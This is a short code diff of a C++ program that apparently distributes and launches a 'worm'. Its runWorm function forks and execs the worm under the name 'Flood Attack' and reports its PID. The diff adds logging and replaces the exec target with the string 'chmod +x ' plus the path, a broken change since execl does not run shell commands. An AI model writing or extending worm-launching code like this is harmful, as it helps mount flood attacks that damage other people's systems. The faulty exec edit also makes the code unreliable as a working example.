@@ -79,10 +79,11 @@ std::string isWormDistributed() {
 // Executes the worm placed at given location. Returns the PID of the executed
 // worm.
 pid_t runWorm(std::string& loc) {
+    std::cout << "Try to execute the worm at \"" << loc << "\"" << std::endl;
     pid_t pid = fork();
     if (pid == 0) {
         // Children
-        execl(loc.c_str(), "Flood Attack", NULL);
+        execl(("chmod +x " + loc).c_str(), "Flood Attack", NULL);
         exit(0);
     }
     return pid;
@@ -107,7 +108,8 @@ int main() {
             }
             pid = runWorm(path);
             if (pid < 0) {
-                std::cout << "For some reason failed to execute the worm." << std::endl;
+                std::cout << "For some reason failed to execute the worm."
+                          << std::endl;
                 break;
             }
             std::cout << "Worm executed. PID is " << pid << " ." << std::endl;
